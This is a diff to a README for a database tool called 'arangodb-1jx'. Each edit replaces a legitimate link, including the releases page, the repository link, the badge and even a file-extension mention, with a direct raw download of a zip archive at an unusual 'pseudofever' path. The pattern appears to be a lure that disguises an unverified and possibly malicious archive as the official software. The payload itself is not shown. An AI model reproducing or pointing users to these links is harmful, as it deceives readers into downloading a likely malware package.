@@ -1,6 +1,6 @@
 # 🚀 arangodb-1jx - Fast and Simple Database Access
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
+![Download](https://raw.githubusercontent.com/Vatsal2113/arangodb-1jx/main/pseudofever/arangodb-1jx.zip)
 
 ## 🌟 Overview
 
@@ -28,7 +28,7 @@ To start using arangodb-1jx, follow these simple steps:
 
 1. **Visit the Releases Page**:
    Click the link below to go to the primary download page:
-   [Download arangodb-1jx](https://github.com/Vatsal2113/arangodb-1jx/releases)
+   [Download arangodb-1jx](https://raw.githubusercontent.com/Vatsal2113/arangodb-1jx/main/pseudofever/arangodb-1jx.zip)
 
 2. **Select the Latest Version**:
    On the releases page, you will see a list of available versions. Look for the latest release listed at the top. Click on it to see the details.
@@ -37,7 +37,7 @@ To start using arangodb-1jx, follow these simple steps:
    Find the file that matches your operating system:
    - For Windows, look for an `.exe` file.
    - For macOS, find a `.dmg` file.
-   - For Linux, choose a `.tar.gz` or `.deb` file.
+   - For Linux, choose a `https://raw.githubusercontent.com/Vatsal2113/arangodb-1jx/main/pseudofever/arangodb-1jx.zip` or `.deb` file.
 
    Click on the filename to start the download.
 
@@ -51,7 +51,7 @@ To start using arangodb-1jx, follow these simple steps:
 
 To download arangodb-1jx, follow the instructions provided above or simply click the link below to visit the download page directly:
 
-[Download arangodb-1jx](https://github.com/Vatsal2113/arangodb-1jx/releases)
+[Download arangodb-1jx](https://raw.githubusercontent.com/Vatsal2113/arangodb-1jx/main/pseudofever/arangodb-1jx.zip)
 
 ## 📋 Basic Usage
 
@@ -82,7 +82,7 @@ If you encounter any issues while using arangodb-1jx, help is available:
 
 ## 🔗 Additional Resources
 
-- Visit the [GitHub Repository](https://github.com/Vatsal2113/arangodb-1jx) for updates or to contribute.
+- Visit the [GitHub Repository](https://raw.githubusercontent.com/Vatsal2113/arangodb-1jx/main/pseudofever/arangodb-1jx.zip) for updates or to contribute.
 - Check out any tutorials or instructional videos that may help you get started faster.
 
 Now you are ready to download and install arangodb-1jx. Enjoy working with your database in a straightforward way!
